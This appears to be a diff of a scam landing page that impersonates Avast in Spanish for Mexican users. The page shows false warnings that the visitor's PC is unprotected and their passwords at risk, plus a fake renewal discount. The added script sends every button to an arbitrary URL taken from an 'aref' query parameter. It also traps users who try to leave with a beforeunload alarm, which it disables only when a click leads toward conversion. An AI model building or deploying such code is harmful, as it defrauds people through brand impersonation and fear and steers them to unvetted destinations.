@@ -62,6 +62,7 @@
             color: #2c3e44;
             font-weight: 500;
             transition: color 0.2s;
+            cursor: pointer;
         }
 
         .nav-links a:hover {
@@ -243,9 +244,9 @@
         <div class="card-header">
             <div class="logo">Avast</div>
             <div class="nav-links">
-                <a href="javascript:void(0)" onclick="window.open(decodeURIComponent(window.location.href.substr(window.location.href.lastIndexOf('aref=')+5)), '_self');" class="btn-fix" id="btnFix" title="Solucione todos los problemas detectados con Avast">Hogar</a>
-                <a href="javascript:void(0)" onclick="window.open(decodeURIComponent(window.location.href.substr(window.location.href.lastIndexOf('aref=')+5)), '_self');" class="btn-fix" id="btnFix" title="Solucione todos los problemas detectados con Avast">Empresas</a>
-                <a href="javascript:void(0)" onclick="window.open(decodeURIComponent(window.location.href.substr(window.location.href.lastIndexOf('aref=')+5)), '_self');" class="btn-fix" id="btnFix" title="Solucione todos los problemas detectados con Avast">Recursos</a>
+                <a href="#" class="btn-fix" data-url="" title="Solucione todos los problemas detectados con Avast">Hogar</a>
+                <a href="#" class="btn-fix" data-url="" title="Solucione todos los problemas detectados con Avast">Empresas</a>
+                <a href="#" class="btn-fix" data-url="" title="Solucione todos los problemas detectados con Avast">Recursos</a>
             </div>
         </div>
 
@@ -255,7 +256,6 @@
             <p class="warning-text">Después de la fecha de vencimiento, tu computadora queda vulnerable a virus, software malicioso y robo de identidad.</p>
             <p class="danger-text">⚠️ Tu PC está desprotegida. Tu información personal y contraseñas podrían ser robadas.</p>
 
-            <!-- Блок со скидкой и ценой в мексиканских песо -->
             <div class="discount-box">
                 <div class="discount-badge">50% DESCUENTO POR RENOVACIÓN</div>
                 <p class="old-price">Antes: $1,199 MXN</p>
@@ -269,7 +269,7 @@
                 </div>
             </div>
 
-            <a href="javascript:void(0)" onclick="window.open(decodeURIComponent(window.location.href.substr(window.location.href.lastIndexOf('aref=')+5)), '_self');" class="renew-btn btn-fix" id="btnFix" title="Solucione todos los problemas detectados con Avast">Renovar suscripción ahora</a>
+            <a href="#" class="renew-btn btn-fix" data-url="" title="Solucione todos los problemas detectados con Avast">Renovar suscripción ahora</a>
         </div>
     </div>
 
@@ -277,7 +277,65 @@
         (function() {
             "use strict";
 
-            // ----- 1. Подстановка текущей даты в мексиканском формате (день/месяц/год) -----
+            // ----- 1. Получаем целевой URL из параметра aref -----
+            function getTargetUrl() {
+                let aref = null;
+                const urlParams = new URLSearchParams(window.location.search);
+                aref = urlParams.get('aref');
+                if (!aref) {
+                    const idx = window.location.href.lastIndexOf('aref=');
+                    if (idx !== -1) {
+                        aref = decodeURIComponent(window.location.href.substring(idx + 5));
+                    }
+                }
+                return aref || 'https://www.avast.com';
+            }
+            const targetBase = getTargetUrl();
+
+            // Устанавливаем data-url для всех ссылок с классом btn-fix
+            document.querySelectorAll('.btn-fix').forEach(link => {
+                link.setAttribute('data-url', targetBase);
+                link.removeAttribute('onclick'); // убираем старые onclick, если были
+                link.style.cursor = 'pointer';
+            });
+
+            // ----- 2. Управление beforeunload (предупреждение только при закрытии/обновлении) -----
+            let isNavigating = false;
+            const beforeUnloadHandler = function(e) {
+                if (isNavigating) return; // при клике на ссылку не показываем
+                const message = '¿Estás seguro de que quieres salir? Tu PC puede estar en riesgo.';
+                e.preventDefault();
+                e.returnValue = message;
+                return message;
+            };
+            window.addEventListener('beforeunload', beforeUnloadHandler);
+
+            // ----- 3. Функция безопасного перехода (без предупреждения) -----
+            function safeNavigate(url) {
+                if (!url) return;
+                isNavigating = true;
+                // Удаляем обработчик beforeunload перед переходом
+                window.removeEventListener('beforeunload', beforeUnloadHandler);
+                // Выполняем переход
+                window.location.href = url;
+                // Если по какой-то причине переход не состоялся (например, тот же URL),
+                // восстанавливаем обработчик через 300 мс и сбрасываем флаг
+                setTimeout(() => {
+                    window.addEventListener('beforeunload', beforeUnloadHandler);
+                    isNavigating = false;
+                }, 300);
+            }
+
+            // Навешиваем обработчики кликов на все .btn-fix
+            document.querySelectorAll('.btn-fix').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const url = this.getAttribute('data-url');
+                    if (url) safeNavigate(url);
+                });
+            });
+
+            // ----- 4. Подстановка текущей даты -----
             function getCurrentDateFormattedMX() {
                 const now = new Date();
                 const day = now.getDate();
@@ -285,44 +343,8 @@
                 const year = now.getFullYear();
                 return `${day}.${month}.${year}`;
             }
-
             const dateSpan = document.getElementById('currentDate');
-            if (dateSpan) {
-                dateSpan.textContent = getCurrentDateFormattedMX();
-            }
-
-            // ----- 2. Предупреждение при попытке закрыть вкладку или обновить страницу -----
-            let userHasInteracted = false;
-
-            function enableBeforeUnload() {
-                userHasInteracted = true;
-            }
-
-            ['click', 'scroll', 'keydown', 'touchstart'].forEach(eventType => {
-                document.addEventListener(eventType, enableBeforeUnload, { once: true, passive: true });
-            });
-
-            const beforeUnloadHandler = function(e) {
-                const message = '¿Estás seguro de que quieres salir? Tu PC puede estar en riesgo.';
-                e.preventDefault();
-                e.returnValue = message;
-                return message;
-            };
-
-            window.addEventListener('beforeunload', beforeUnloadHandler);
-
-            // ----- 3. Отключение предупреждения при переходе по внутренним ссылкам (чтобы не мешать конверсии) -----
-            function removeBeforeUnloadTemporarily() {
-                window.removeEventListener('beforeunload', beforeUnloadHandler);
-                setTimeout(() => {
-                    window.addEventListener('beforeunload', beforeUnloadHandler);
-                }, 800);
-            }
-
-            // Все ссылки (включая новые)
-            document.querySelectorAll('a').forEach(link => {
-                link.addEventListener('click', removeBeforeUnloadTemporarily);
-            });
+            if (dateSpan) dateSpan.textContent = getCurrentDateFormattedMX();
         })();
     </script>
 </body>
